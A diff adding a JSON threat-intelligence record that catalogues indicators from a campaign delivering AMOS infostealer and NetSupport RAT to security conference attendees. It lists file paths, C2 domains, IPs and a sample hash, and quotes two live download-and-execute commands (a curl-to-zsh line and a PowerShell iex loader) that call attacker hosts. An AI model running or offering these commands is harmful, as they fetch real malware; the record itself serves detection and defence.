@@ -1,0 +1,393 @@
+{
+  "malware_family": "AMOS and NetSupport RAT",
+  "threat_actor": "Unnamed",
+  "platforms": [
+    "windows",
+    "macos"
+  ],
+  "summary": "An unnamed actor targets security conference attendees using a malicious Google Doc with a custom Apps Script. The campaign delivers AMOS infostealer to macOS victims, while Windows users receive NetSupport RAT, a TLS-intercepting proxy, and a Ledger wallet implant via a multi-stage infection chain.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "DecryptPanel.html",
+      "context": "Malicious Google Apps Script sidebar file in the Google Doc.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -fsSL https://apple-googleapi.com/i | zsh",
+      "context": "macOS ClickFix-style command to download and execute payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/lksopo",
+      "context": "macOS AMOS staging directory for stolen data.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Library/LaunchDaemons/com.xdivcmp.plist",
+      "context": "macOS persistence mechanism for the backdoor.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.phost",
+      "context": "macOS backdoor config file containing the panel host IP.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.bhost",
+      "context": "macOS backdoor config file containing the bot host IP.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "doshell",
+      "context": "Command for arbitrary command execution in the macOS backdoor.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "enablesocks5",
+      "context": "Command to turn macOS host into a SOCKS5 proxy.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "$t=$env:temp+'\\sys.ps1';try{Import-Module BitsTransfer -EA Stop;Start-BitsTransfer 'https://1foqo.lat/core4' $t -EA Stop}catch{Invoke-WebRequest 'https://1foqo.lat/core4' -OutFile $t -UseBasicParsing};iex(gc $t -Raw);ri $t",
+      "context": "Windows PowerShell script for downloading the loader.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%LOCALAPPDATA%\\Microsoft\\Windows\\UpdateCache",
+      "context": "Staging directory for encrypted Windows payloads.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DocsendInstaller.exe",
+      "context": "Windows NSIS installer containing trojanized Electron app.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\Cache_328189ho",
+      "context": "One of the possible working directories for the Windows loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%UserProfile%\\VirtualBoxVGA",
+      "context": "One of the possible working directories for the Windows loader.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\Administrator\\Desktop\\2RMS\\client32u.ini",
+      "context": "Path from operator's build machine in NetSupport RAT config.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "NSM1234",
+      "context": "License holder in NetSupport RAT configuration.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "MsBuild.exe",
+      "context": "Trusted process hollowed to run proxy and Ledger implant payloads.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "O=Google Trust Services, CN=WR3",
+      "context": "Subject of the self-signed root CA installed by the proxy.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "127.0.0.1 www.virustotal.com",
+      "context": "Entry added to the Windows hosts file to redirect traffic.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "LocalProxy",
+      "context": "Inbound firewall rule name for the hollowed MsBuild process.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "Ledger Wallet Installer",
+      "context": "Registry Run entry name for Ledger implant persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%APPDATA%\\Ledger Live\\app.crc32",
+      "context": "File created by Ledger implant to store the bot ID.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\system32\\drivers\\nskbfltr.sys",
+      "context": "NetSupport kernel-mode keyboard filter driver.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "NetSupport Manager",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "nskbfltr",
+      "context": "Service name for the NetSupport keyboard filter driver.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "NetSupport Manager",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "apple-googleapi.com",
+      "context": "Domain used in macOS initial download command.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "github.com/ariasalmonterachel13/gapi/releases",
+      "context": "GitHub releases page hosting macOS 'manual update' payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "86.54.25.213",
+      "context": "macOS panel host receiving exfiltrated data.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.253.248.181",
+      "context": "macOS C2/Bot host used by the polling backdoor.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "apple.eu03hub.com",
+      "context": "macOS redirect destination for DocSend lure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://gapidriver.com/installer/GapiUpdate.application",
+      "context": "Windows ClickOnce installation location for 'Google API Connector'.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://1foqo.lat/core4",
+      "context": "URL for the PowerShell loader script on Windows.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://2fksf.lat/res10.php",
+      "context": "URL for downloading an encrypted Windows payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://docsend.online/download/drivers",
+      "context": "Fake download URL serving the counterfeit DocSend installer.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "microsoft.eu02hub.com",
+      "context": "Windows redirect destination for DocSend lure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://docsend.web12api.com/api/launcher/start",
+      "context": "Endpoint for exfiltrating host profile and receiving stage two.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "signow.web12api.com",
+      "context": "Sibling campaign domain used to retrieve a working stage two payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "eu03hub.com",
+      "context": "Domain hosting the three stage three payloads.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "msedgewebview1.pro",
+      "context": "NetSupport RAT C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "msedgewebview2.pro",
+      "context": "NetSupport RAT C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "87.120.104.88",
+      "context": "IP address for the NetSupport RAT C2 gateways.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://eu07connect.com/api/commands/<bot id>",
+      "context": "Polling URL for the Ledger wallet implant.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "15afe14b5db2896d35a0c4f3139db85158da120fa90613c975c88f10bbbcc420",
+      "description": "macOS AMOS stealer executable from GAPIUpdate.app bundle."
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive",
+    "dotnet",
+    "macho"
+  ]
+}
